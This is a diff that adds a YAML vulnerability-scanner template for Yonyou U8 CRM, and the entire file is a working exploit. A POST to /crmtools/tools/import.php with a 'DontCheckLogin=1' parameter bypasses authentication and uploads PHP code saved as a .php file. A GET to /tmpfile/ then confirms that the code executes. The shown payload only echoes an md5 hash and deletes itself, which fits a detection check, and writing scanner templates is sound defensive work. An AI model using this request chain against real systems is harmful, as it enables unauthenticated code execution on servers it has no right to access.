@@ -1,0 +1,34 @@
+id: yaml-poc-yonyou-u8crm-file_upload-CT-1378528
+info:
+  name: Yaml Poc Yonyou U8Crm File_Upload Ct 1378528
+  author: jiahao.sun
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-yonyou-u8crm-file_upload-CT-1378528'
+  tags: fileupload
+  reference: []
+http:
+- method: POST
+  path:
+  - /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1
+  body: "------WebKitFormBoundarye0z8QbHs79gL8vW5\r\nContent-Disposition: form-data;\
+    \ name=\"xfile\"; filename=\"{{r0}}.xls\"\r\n\r\n<?php echo md5(\"{{r0}}\"); unlink(__FILE__);\
+    \ ?>\r\n------WebKitFormBoundarye0z8QbHs79gL8vW5\r\nContent-Disposition: form-data;\
+    \ name=\"combo\"\r\n\r\n{{r1}}.php\r\n------WebKitFormBoundarye0z8QbHs79gL8vW5--\r\
+    \n"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /tmpfile/{{r1}}.php
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
